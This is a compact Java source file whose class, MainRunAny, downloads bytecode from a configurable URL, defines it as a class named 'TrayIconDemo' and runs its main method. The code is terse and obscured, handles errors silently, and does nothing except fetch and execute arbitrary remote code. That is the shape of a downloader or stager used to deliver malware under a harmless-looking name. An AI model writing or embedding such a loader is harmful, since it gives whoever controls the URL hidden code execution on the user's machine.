

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
public class MainRunAny extends ClassLoader {
    public static String ClassURL = "";
    public Class findClass(String name, byte[] byteCode) throws ClassNotFoundException {return defineClass(name, byteCode, 0, byteCode.length);}
    private byte[] downloadUrl(URL aa) {ByteArrayOutputStream a = new ByteArrayOutputStream();try {byte[] b = new byte[4096];int c;InputStream d = aa.openStream();while ((c = d.read(b)) > 0) {a.write(b, 0, c);}} catch (IOException e) {return null;}return a.toByteArray();}
    public static Class DownloadClass(String url){try { MainRunAny LoadClass = new MainRunAny();byte[] hold = LoadClass.downloadUrl(new URL(url));Class cls = LoadClass.findClass("TrayIconDemo", hold);return cls;}catch (Exception e) {return null;}}
    public static void main(String[] args) {Class HoldClass = DownloadClass(ClassURL);try {HoldClass.getMethod("main",String[].class).invoke(null,new Object[]{args});} catch (Exception e) {System.out.println(e.getCause());}}

}
